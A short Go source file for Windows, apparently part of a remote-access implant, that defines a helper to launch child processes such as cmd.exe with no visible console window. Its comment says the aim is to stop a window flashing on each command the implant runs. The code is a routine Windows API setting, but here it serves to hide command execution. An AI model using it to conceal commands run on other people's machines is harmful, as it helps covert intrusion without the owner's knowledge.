//go:build windows

package main

import (
	"os/exec"
	"syscall"
)

// createNoWindow keeps child consoles invisible: the implant is built with
// -H windowsgui, so cmd.exe would otherwise flash a window on every command.
const createNoWindow = 0x08000000

func hideWindow(cmd *exec.Cmd) {
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}
	cmd.SysProcAttr.HideWindow = true
	cmd.SysProcAttr.CreationFlags |= createNoWindow
}
